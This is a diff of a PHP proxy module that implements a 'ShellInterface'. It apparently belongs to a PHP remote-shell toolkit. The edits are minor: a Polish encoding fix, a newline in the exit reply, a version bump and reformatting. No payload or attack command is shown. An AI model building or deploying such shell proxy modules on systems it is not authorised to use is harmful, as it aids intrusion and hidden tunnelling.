@@ -131,7 +131,7 @@ class Proxy
 		}
 
 
-		echo "Proxy zostaĹ‚o uruchomione\r\n\r\n";
+		echo "Proxy zostało uruchomione\r\n\r\n";
 
 		for(;;)
 		{
@@ -170,7 +170,7 @@ class Proxy
 				{
 					case 'exit':
 						echo "Command -> exit\r\n";
-						socket_write( $rClient, "Dobranoc ;)" );
+						socket_write( $rClient, "Dobranoc ;)\r\n" );
 
 						socket_close( $rClient );
 
@@ -398,7 +398,7 @@ class ModuleProxy implements ShellInterface
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.0 2011-06-04 - <krzotr@gmail.com>';
+		return '1.01 2011-09-07 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -469,7 +469,8 @@ DATA;
 			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
 
 			$oProxy = new Proxy();
-			$oProxy -> setPort( $this -> oShell -> aArgv[0] )
+			$oProxy
+				-> setPort( $this -> oShell -> aArgv[0] )
 				-> setNoImages( in_array( 'i', $this -> oShell -> aOptv ) )
 				-> get();
 			ob_end_flush();
